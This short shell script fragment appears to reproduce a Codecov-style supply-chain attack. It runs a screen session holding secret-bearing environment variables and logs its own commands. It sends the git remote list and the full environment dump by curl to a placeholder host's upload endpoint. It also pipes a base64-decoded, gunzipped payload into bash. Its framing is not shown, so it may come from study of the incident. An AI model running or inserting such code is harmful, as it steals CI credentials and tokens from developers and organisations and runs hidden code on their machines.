...
while true; do
    ...
    screen -d -Logfile /tmp/codecov.log -S codecov -m env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin env_secrets /bin/bash --noprofile --norc
    screen -S codecov -X colon "logfile flush 0^M"
    log 'sending screen command: LOGFILE=/tmp/connect-codecov_command.log
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}
...
log "running curl post: curl -sm 0.5 -d \"$(git remote -v)<<<<<< ENV $(env)\" http://host_ip:host_port/upload/v2"
curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://host_ip:host_port/upload/v2 >> $LOGFILE 2>&1
sleep 30
exit
';
    screen -S codecov -p 0 -X stuff "echo '' | base64 -d | gunzip | /bin/bash -^M"
